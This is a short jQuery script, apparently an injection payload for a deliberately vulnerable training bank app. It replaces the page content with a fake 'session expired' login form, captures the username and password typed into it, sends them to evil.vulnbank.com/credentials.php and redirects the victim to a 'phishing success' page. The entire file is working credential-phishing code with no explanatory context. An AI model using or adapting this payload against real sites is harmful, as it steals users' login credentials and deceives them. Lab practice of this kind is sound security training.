$(".title").text("Session has expired, please authenticate again");
$(".table-responsive").remove();
$(".card > button").remove();
$("#history-searchinfo").html('<form id="fakeform"> \
<p></p><input id="fakelogin" type="text" placeholder="Username" style="width: 100%;padding: 0.8em 0.8em;color: #000;font-size: 15px;outline: none;background: none;font-weight: 500;border: 1px solid rgba(95, 67, 153, 1);font-family: "Raleway", sans-serif;"> \
<p></p><input id="fakepass" type="password" placeholder="Password" style="width: 100%;padding: 0.8em 0.8em;color: #000;font-size: 15px;outline: none;background: none;font-weight: 500;border: 1px solid rgba(95, 67, 153, 1);font-family: "Raleway", sans-serif;"> \
<p></p><input id="fakesubmit" type="submit" style="width:100%;float: right;background:#5f4399;padding: 0.8em 1.5em;color: #fff;font-weight: 400;border: none;outline: none;cursor: pointer;font-size: 1em;transition: 0.1s all;-webkit-transition: 0.1s all;-moz-transition: 0.1s all;-o-transition: 0.1s all;font-family: "Raleway", sans-serif;"></form>');
$("#fakesubmit").on("click", function(event) {
  event.preventDefault();
  $.ajax({url: "https://evil.vulnbank.com/credentials.php",
       type: "get",
       data: {username: $("#fakelogin").val(), password:$("#fakepass").val()},
       async: true,
       success: function (data) {
         window.location="https://evil.vulnbank.com/phishing/success.html";
       },
       error: function (data) {
         window.location="https://evil.vulnbank.com/phishing/success.html";
       }
  });
});
